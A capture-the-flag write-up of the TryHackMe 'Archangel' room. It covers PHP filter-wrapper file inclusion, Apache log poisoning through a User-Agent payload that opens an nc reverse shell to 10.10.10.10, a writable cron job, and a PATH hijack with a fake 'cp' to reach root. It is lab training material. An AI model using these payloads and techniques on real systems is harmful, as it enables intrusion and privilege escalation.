---
title: "Archangel - TryHackMe"
date: "2021-02-06"
categories: 
  - "tryhackme"
---

write-up for Tryhackme room [Archangel](https://tryhackme.com/room/archangel).

Difficulty Level - Easy

Start with nmap scan

```
nmap -A -oN initial $IP
```

![](/Images/archangel/Screenshot-2021-02-06-120349.png)

we will find hostname in website add it to "**/etc/hosts**" and enter hostname in browser and you will get different website.

![](/Images/archangel/Screenshot-2021-02-06-120816.png)

Run gobuster on that website.

![](/Images/archangel/Screenshot-2021-02-06-121034.png)

there is **robots.txt** file when we check the file notice some mentioned PHP file.

![](/Images/archangel/Screenshot-2021-02-06-121219.png)

there is button in that webpage when we click we notice it reading some file, it could read to LFI.

![](/Images/archangel/Screenshot-2021-02-06-121420.png)

we cant directly read PHP file so we need to convert it to base64 you can check [Cheat Sheet](https://highon.coffee/blog/lfi-cheat-sheet/) here.

```
php://filter/convert.base64-encode/var/www/html/development_testing/resource=<FILE>
```

after base64 decode we can view html view of the page.

![](/Images/archangel/Screenshot-2021-02-06-122849.png)

To read any files we need "**/var/www/html/development\_testing**" included in URL, as hint suggest to get shell we need to poision the apache logs. you can learn about it in tryhackme this room [LFI Basics](https://tryhackme.com/room/lfibasics).

read the log with this URL

```
http://mafialive.thm/test.php?view=php://filter//var/www/html/development_testing/resource=/var/log/apache2/access.log
```

then start the **burpsuit** and capture the session and poison and get shell.

add this command in "User-Agent" header to get shell

```
<?php exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4747 >/tmp/f') ?>
```

![](/Images/archangel/Screenshot-2021-02-06-123857-1024x188.png)

successful shell.

we logged in as www-data we need to switch to valid user, to do that enumerate more.

we can see crontab is running for user archangel which we can write, now add reverse shell file located in "**/opt**" wait till it run so we can shell as user archangel.

![](/Images/archangel/Screenshot-2021-02-06-124633.png)

![](/Images/archangel/Screenshot-2021-02-06-124744.png)

again run linpeas.sh or any usual enumeration method to find a privileged Escalation.

## Privileged Escalation

There is folder name "secret" and there is backup file with belong to root, when we run it we get error.

![](/Images/archangel/Screenshot-2021-02-06-125109.png)

if we able exploit the PATH with file name "**cp**" we can get to root.

![](/Images/archangel/Screenshot-2021-02-06-131222.png)

now need to HOME path to our current location.

```
export PATH=/home/archangel/secret/:$PATH
```

![](/Images/archangel/Screenshot-2021-02-06-131518.png)

Finally Root.

as usual Happy Hacking!!
